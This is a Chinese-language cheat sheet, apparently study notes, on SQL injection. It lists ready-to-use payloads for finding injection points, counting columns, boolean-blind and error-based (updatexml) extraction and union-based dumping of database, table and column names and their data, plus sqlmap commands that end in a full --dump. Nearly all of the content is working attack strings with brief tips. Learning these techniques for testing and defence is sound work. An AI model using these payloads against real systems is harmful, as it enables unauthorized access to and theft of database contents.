# SQL注入

<aside>
💡 SQL语句以字符串拼接，插入变量的方式构造，在相关位置插入脱库指令

</aside>

1. 利用闭合，判断是否存在注入点
    
    ```sql
    ' and 1=1 -- p
    ```
    
    ```sql
    " and 1=1 -- p
    ```
    
    ```sql
    ") and 1=1 -- p
    ```
    
    ```sql
    ")) and 1=1 -- p
    ```
    
2. 存在注入点，按列排序，判断总列数
    
    <aside>
    💡 从小到大逐个尝试，直到出现异常
    
    </aside>
    
    ```sql
    order by 4 -- p
    ```
    
- 界面不存在回显
    - 布尔盲注
        1. 猜测库名
            
            <aside>
            💡 left(string, int) 返回从左侧开始，前几位
            
            </aside>
            
            ```sql
            and left(database(),1)='a' -- p
            ```
            
            1. 猜测库名长度
                
                ```sql
                and length(database())=3 -- p
                ```
                
            2. 二分法猜测库名
                
                ```sql
                and ascii(substr(database(),n,1))>97
                ```
                
        2. 爆破表名
            
            <aside>
            💡 如果表名存在，原语句不运行where筛选，反之，报不存在表名错误
            
            </aside>
            
            ```sql
            or exists(select * from 表名) -- p
            ```
            
        3. 猜测表名
            
            <aside>
            💡 i：第几个表，n：表名的第几个字
            
            </aside>
            
            ```sql
            and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit i,1),n,1))>97
            ```
            
            1. 猜测库中表的数量
                
                ```sql
                and (select count(table_name) from information_schema.tables where table_schema=database())=2
                ```
                
            2. 猜测表名长度
                
                ```sql
                and length(substr((select table_name from information_schema.tables where table_schema=database() limit i,1),1))=5
                ```
                
                <aside>
                💡 此后，猜测列名（字段名）和猜测表名方法一致
                
                </aside>
                
    - 报错注入
        
        错误回显内返回查询内容
        
        ```sql
        union select updatexml(1, concat(0x7e, (select user()), 0x7e,1) -- p
        ```
        
- 界面存在回显
    1. 采用联合查找进一步获取表格信息
        
        <aside>
        💡 1, 2, 3为任意数字，个数与总列数一致
        
        </aside>
        
        <aside>
        💡 数字后不接表名，查询不指向已有表，指向一个填充给定数字的表
        
        </aside>
        
        <aside>
        💡 观察回显，此时可能并没有理想的回显，尝试将`id = 1`修改为无法检索到的位置，防止覆盖联合查找的输出
        
        </aside>
        
        ```sql
        union select 1, 2, 3 -- p
        ```
        
        1. 获取库名
            
            ```sql
            union select 1, database(), 3 -- p
            ```
            
        2. 获取库中全部表名
            
            <aside>
            💡 limit 0, 1：从第0个元素开始，读取1个元素（即读取第一个元素）
            
            </aside>
            
            ```sql
            union select 1, group_concat(table_name), 3 from information_schema.tables where table_schema = 'detected_database_name' limit 0, 1 -- p
            ```
            
        3. 获取表中全部列名
            
            ```sql
            union select 1, group_concat(column_name), 3 from information_schema.columns where table_schema = 'detected_database_name' and table_name = 'target_table_name' limit 0, 1 -- p
            ```
            
        4. 获取列中数据
            
            ```sql
            union select 1, 'target_column_name', 3 from 'target_table_name' -- p
            ```
            
- SQLMap工具注入
    1. 检查是否存在注入点
        
        <aside>
        💡 网址后最好接有GET型参数
        
        </aside>
        
        ```bash
        sqlmap -u http://web_address/?parameter=1
        ```
        
    2. 查询数据库名
        
        ```bash
        sqlmap -u http://web_address/?parameter=1 --current-db
        ```
        
    3. 查询数据库内所有表名
        
        ```bash
        sqlmap -u http://web_address/?parameter=1 -D [database_name] --tables
        ```
        
    4. 查询表中所有列名（字段名）
        
        ```bash
        sqlmap -u http://web_address/?parameter=1 -D [database_name] -T [table_name] --columns
        ```
        
    5. 查询列内值
        
        ```bash
        sqlmap -u http://web_address/?parameter=1 -D [database_name] -T [table_name] -C [column_name1], [column_name2] --dump
        ```